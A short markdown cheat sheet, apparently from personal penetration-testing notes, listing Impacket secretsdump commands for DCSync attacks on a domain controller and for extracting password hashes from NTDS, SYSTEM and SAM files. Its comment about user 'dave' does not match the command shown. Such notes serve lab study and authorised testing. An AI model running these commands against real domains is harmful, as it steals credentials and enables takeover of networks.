---
tags:
---
# secretsdump

Perform DCSync attacks

## Capabilities

```powershell
# Perform a DCSync attack against the user dave, as jeffadmin
secretsdump.py $DOMAIN/$USER:'$PASSWD'@$IP -just-dc-user administrator
secretsdump.py -k -no-pass $DOMAIN/$USER@$IP

# Extract credentials from a shadow copy
secretsdump.py -ntds NTDS -system SYSTEM LOCAL

# Extract credentials from windows.old
secretsdump.py -sam SAM -system SYSTEM LOCAL
```
